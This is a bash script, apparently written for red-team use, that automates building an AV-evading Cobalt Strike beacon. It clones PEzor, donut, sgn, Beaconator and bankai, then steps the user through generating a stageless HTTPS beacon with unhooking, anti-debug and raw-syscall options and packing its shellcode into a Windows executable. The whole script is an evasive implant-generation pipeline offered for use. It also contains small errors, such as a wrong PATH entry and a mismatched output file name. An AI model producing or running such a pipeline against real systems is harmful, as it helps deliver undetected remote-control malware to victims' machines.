#!/usr/bin/env bash


#Banner
sleep 1
echo -e "\n\n"
cat banner.txt

# Variables
#example directory - this would end up being /tools
bold="\033[1m"
dir=`pwd`/apezor
red=`tput setaf 1`
green="\033[1;32m"
reset=`tput sgr0`
echo -e "\n${green}        [+]${reset}${red} semi ${green}Automated PEzor Payload Geneartor Script [+]${reset}"
echo -e "\n${red}BETA v1.0. For any comments, questions, or improvements contact: ${green}Jhony Alavez${reset}"

sleep 1
echo -e "\n\n"
mkdir $dir
##### Grabbing Repos and Dependencies
echo -e "${red}[+] Cloning PEzor!${reset}"
git clone https://github.com/phra/PEzor $dir/pezor/

sleep 2
echo -e "${red}\n[+] Cloning Dependency >> wclang${reset}"
git clone https://github.com/tpoechtrager/wclang.git $dir/wclang/

sleep 2
echo -e "${red}\n[+] Cloning Dependency >> donut${reset}"
git clone https://github.com/TheWover/donut.git $dir/donut/

sleep 2
echo -e "${red}\n[+] Cloning Dependency >> sgn${reset}"
wget https://github.com/EgeBalci/sgn/releases/download/2.0/sgn_linux_amd64_2.0.zip -P $dir

cd $dir
unzip sgn_linux_amd64_2.0.zip
cd ..

sleep 2
echo -e "${red}\n[+] Cloning Beaconator!${reset}"
git clone https://github.com/capt-meelo/Beaconator.git $dir/Beaconator/

sleep 2
echo -e "${red}\n[+] Cloning Bankai!${reset}"
git clone https://github.com/bigb0sss/bankai.git $dir/bankai/

sleep 2
echo -e "${red}\n[!]Configuring Dependencies...${reset}"

cd $dir/wclang/
cmake -DCMAKE_INSTALL_PREFIX=_prefix_ .
make
make install



sleep 2
echo -e "${red}\n[!]Configuring Dependencies...${reset}"
sudo apt remove python3-donut
cd $dir/donut/
sudo pip3 install .
pip3 install donut-shellcode 
cd $dir

sleep 2
echo -e "${red}\n[!]Configuring PATH Variables...${reset}"
export PATH=$PATH:$dir/PEzor/wclang/_prefix_/bin
export PATH=$PATH:$dir/donut
export PATH=$PATH:$dir/sgn_linux_amd64_2.0


sleep 2
echo -e "\n"
#echo -n "${red}Create a Stageless Windows Executable${reset}"
read -n1 -s -r -p "$(echo -e ${red}Create a Stageless Windows Executable and save to this current directory:${reset}`pwd`${red} '\n'Then press ENTER to continue.${reset})" key

if [ "$key" = '' ]; then
    # ENTER pressed, do something
    sleep 1
    echo -e "\n"
    read -p "${red}Enter the generated payload file name: ${reset}" payload

    cd $dir/pezor/
    bash PEzor.sh ../$payload
   
    echo -e "\n\n"
    echo -e "${red}If you see a message like the following above: ${reset}[ ! ] Done! Check /path/to/test.exe.packed.exe ...${red} \n Then you must create a PEzor via Cobalt Strike.
        \nFollow these instructions: \n\n${reset}
        ${bold}Load the Beacontor.cna file in Cobalt Strike${reset}

        Toolbar > 'Cobalt Strike' > Script Manager

        Scripts Tab > Load > Navigate to /tools/Beaconator > beaconator.cna > Load

        ${bold}Now that it's loaded let's generator a new PEzor payload${reset} 

        Toolbar > 'Generate Beacon' > Stageless > Via PEzor \(Linux Only\)

        ${bold}Select the Following from the Payload Generator window:${reset}

        Listener:     https
        Architecture: x64
        Unhook:           Checked
        Anti-debug:   Checked
        Raw Syscalls: Checked
        Self:     Checked
        Output Format: exe

        Generate

    
        ${red}\nHit ENTER when the payload has been generated.${reset}"

        read key

        if [ "$key" = '' ]; then
            #ENTER pressed, do something
            sleep 2
            echo -e "\n${red}[+] Bankai! ${reset}"
            payload2=$dir/Beaconator/output/pezor/shellcode.bin

            cd $dir/bankai

            GO111MODULE=off go build bankai.go

            sudo ./bankai -i  $payload2 -o XX-pezor-https.exe -t win64_CreateThread.tmpl -a 64
            
            read -p "${red}Enter the directory to save your final payload to (ex. /home/user/Documents/):${reset}" paydir
            cp XX-pezor-https.exe $paydir

            sleep 2
            echo -e "\n\n${green}[+] Done!\n${reset}${red}You may now test your payload ${green}${paydir}finalpezor.exe ${reset}${red}in Windows!\n${reset}"

        else
            echo -e "\n inner ifelse block"
            echo [$key] not empty
        fi
else
    # Anything else pressed, do whatever else.
    echo -e "\noutter ifelse block"
    echo [$key] not empty
fi
